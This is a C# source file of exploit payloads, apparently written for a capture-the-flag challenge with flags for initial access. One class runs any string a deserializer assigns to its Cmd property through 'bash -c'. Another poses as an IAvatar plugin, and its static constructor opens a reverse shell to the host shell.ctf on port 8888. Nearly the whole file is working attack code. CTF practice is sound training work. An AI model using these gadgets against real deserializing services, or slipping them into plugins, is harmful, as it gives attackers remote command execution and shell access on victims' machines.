namespace Payloads;

using System.Diagnostics;
using Mycoverse.Common.Model;

using System.Net.Sockets;

// This project contains several example exploit payloads. They're all packaged here but can be used for
// Flag 1 (initial access) and Flag 4 (Only the class which implements IAvatar, unless using .NET 6's module initializers)

// Executes a command given as the property Cmd when it is set by the deserializer.
// The command is ran as part of `bash -c "$CMD"`
public class Execute
{
    public Execute()
    {

    }

    public string Cmd { 
        get => string.Empty; 
        
        set 
        {
            var cmd = value;
            System.Diagnostics.Process.Start("bash", $"-c \"{cmd}\"");
        }
    }
}

public class Avatar : IAvatar
{
    static Avatar()
    {
        var proc = Process.Start("bash", "-c \"bash -i >& /dev/tcp/shell.ctf/8888 0>&1\"");
        proc.WaitForExit();
    }

    public void Render(float time) { }

    public byte[] Signature => new byte[0];

    public string Author => "alxbl";

    public DateTime Released => DateTime.UtcNow;

    public Version Version => new Version(1, 0, 0);

    public decimal Cost => 1.0M;

    public static void Main()
    {
        // Do nothing.
    }
}